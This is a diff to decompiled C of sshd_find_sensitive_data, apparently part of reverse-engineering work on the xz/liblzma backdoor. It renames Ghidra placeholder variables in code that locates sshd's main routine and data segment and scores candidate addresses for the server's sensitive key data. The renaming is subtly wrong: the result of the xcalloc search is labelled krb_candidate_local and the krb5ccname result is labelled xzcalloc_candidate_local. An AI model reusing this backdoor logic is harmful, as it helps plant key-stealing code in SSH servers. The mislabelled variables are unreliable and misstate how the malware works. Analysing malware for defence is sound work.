@@ -43,6 +43,7 @@ BOOL sshd_find_sensitive_data
   secret_data_item_t *psVar16;
   sensitive_data *psVar17;
   byte bVar18;
+  secret_data_item_t secret_probe_items;
   lzma_allocator *allocator;
   u8 *code_start;
   u8 *code_end;
@@ -50,11 +51,11 @@ BOOL sshd_find_sensitive_data
   sensitive_data *xzcalloc_candidate;
   sensitive_data *krb_candidate;
   sensitive_data *winning_candidate;
-  u64 local_b0;
-  u8 *local_a8;
-  u8 *local_a0;
-  sensitive_data *local_98;
-  sensitive_data *local_90;
+  u64 data_segment_size;
+  u8 *sshd_main_addr;
+  u8 *code_scan_limit;
+  sensitive_data *xzcalloc_candidate_local;
+  sensitive_data *krb_candidate_local;
   secret_data_item_t local_88;
   code *local_70;
   undefined8 local_68;
@@ -95,11 +96,11 @@ BOOL sshd_find_sensitive_data
     psVar16 = (secret_data_item_t *)((long)psVar16 + (ulong)bVar18 * -8 + 4);
   }
   winning_candidate = (sensitive_data *)0x0;
-  local_b0 = 0;
-  local_a8 = (u8 *)0x0;
-  local_a0 = (u8 *)0x0;
-  local_98 = (sensitive_data *)0x0;
-  local_90 = (sensitive_data *)0x0;
+  data_segment_size = 0;
+  sshd_main_addr = (u8 *)0x0;
+  code_scan_limit = (u8 *)0x0;
+  xzcalloc_candidate_local = (sensitive_data *)0x0;
+  krb_candidate_local = (sensitive_data *)0x0;
   allocator_00 = get_lzma_allocator();
   allocator_00->opaque = libcrypto;
   ppVar9 = (pfn_EVP_DigestVerifyInit_t)lzma_alloc(0x118,allocator_00);
@@ -117,8 +118,8 @@ BOOL sshd_find_sensitive_data
   if (pEVar12 == (Elf64_Sym *)0x0) {
     return FALSE;
   }
-  data_start_00 = (u8 *)elf_get_data_segment(sshd,&local_b0,FALSE);
-  uVar3 = local_b0;
+  data_start_00 = (u8 *)elf_get_data_segment(sshd,&data_segment_size,FALSE);
+  uVar3 = data_segment_size;
   if (data_start_00 == (u8 *)0x0) {
     return FALSE;
   }
@@ -133,28 +134,30 @@ BOOL sshd_find_sensitive_data
   if (ppVar13 != (pfn_EVP_CIPHER_CTX_new_t)0x0) {
     funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
   }
-  BVar5 = sshd_find_main(&local_a8,sshd,libcrypto,funcs);
-  code_start_00 = local_a8;
+  BVar5 = sshd_find_main(&sshd_main_addr,sshd,libcrypto,funcs);
+  code_start_00 = sshd_main_addr;
   if (BVar5 == FALSE) {
     return FALSE;
   }
-  ctx->sshd_main = local_a8;
-  BVar5 = is_endbr64_instruction(local_a8,local_a8 + 4,0xe230);
+  ctx->sshd_main = sshd_main_addr;
+  BVar5 = is_endbr64_instruction(sshd_main_addr,sshd_main_addr + 4,0xe230);
   ctx->uses_endbr64 = (uint)(BVar5 != FALSE);
   puVar4 = (u8 *)((long)pvVar10 + (long)psVar17);
   if ((BVar5 != FALSE) &&
-     (BVar5 = find_function(code_start_00,(void **)0x0,&local_a0,code_start_00,
-                            (u8 *)((long)pvVar10 + (long)psVar17),FIND_NOP), puVar4 = local_a0,
-     BVar5 == FALSE)) {
+     (BVar5 = find_function(code_start_00,(void **)0x0,&code_scan_limit,code_start_00,
+                            (u8 *)((long)pvVar10 + (long)psVar17),FIND_NOP),
+     puVar4 = code_scan_limit, BVar5 == FALSE)) {
     return FALSE;
   }
-  local_a0 = puVar4;
+  code_scan_limit = puVar4;
   BVar5 = sshd_get_sensitive_data_address_via_xcalloc
-                    (data_start_00,data_start_00 + uVar3,code_start_00,local_a0,refs,&local_90);
+                    (data_start_00,data_start_00 + uVar3,code_start_00,code_scan_limit,refs,
+                     &krb_candidate_local);
   BVar6 = sshd_get_sensitive_data_address_via_krb5ccname
-                    (data_start_00,data_start_00 + uVar3,code_start_00,local_a0,&local_98,sshd);
+                    (data_start_00,data_start_00 + uVar3,code_start_00,code_scan_limit,
+                     &xzcalloc_candidate_local,sshd);
   ppVar14 = (pfn_EVP_chacha20_t)lzma_alloc(0xc28,allocator_00);
-  psVar17 = local_90;
+  psVar17 = krb_candidate_local;
   funcs->EVP_chacha20 = ppVar14;
   if (ppVar14 != (pfn_EVP_chacha20_t)0x0) {
     funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
@@ -164,26 +167,26 @@ LAB_00105772:
     if (BVar6 == FALSE) goto LAB_001057d3;
     uVar7 = 0;
 LAB_001057a6:
-    uVar8 = sshd_get_sensitive_data_score(local_98,sshd,refs);
+    uVar8 = sshd_get_sensitive_data_score(xzcalloc_candidate_local,sshd,refs);
   }
   else {
     if (BVar6 != FALSE) {
-      if (local_90 == local_98) {
-        uVar7 = sshd_get_sensitive_data_score(local_90,sshd,refs);
+      if (krb_candidate_local == xzcalloc_candidate_local) {
+        uVar7 = sshd_get_sensitive_data_score(krb_candidate_local,sshd,refs);
         if (uVar7 < 8) {
           return FALSE;
         }
         goto LAB_0010575e;
       }
-      uVar7 = sshd_get_sensitive_data_score(local_90,sshd,refs);
+      uVar7 = sshd_get_sensitive_data_score(krb_candidate_local,sshd,refs);
       goto LAB_001057a6;
     }
     if (BVar5 == FALSE) goto LAB_00105772;
-    uVar7 = sshd_get_sensitive_data_score(local_90,sshd,refs);
+    uVar7 = sshd_get_sensitive_data_score(krb_candidate_local,sshd,refs);
     uVar8 = 0;
   }
-  if (((uVar8 <= uVar7) && (psVar17 = local_90, 7 < uVar7)) ||
-     ((uVar7 <= uVar8 && (psVar17 = local_98, 7 < uVar8)))) {
+  if (((uVar8 <= uVar7) && (psVar17 = krb_candidate_local, 7 < uVar7)) ||
+     ((uVar7 <= uVar8 && (psVar17 = xzcalloc_candidate_local, 7 < uVar8)))) {
 LAB_0010575e:
     ctx->sshd_sensitive_data = psVar17;
     return TRUE;
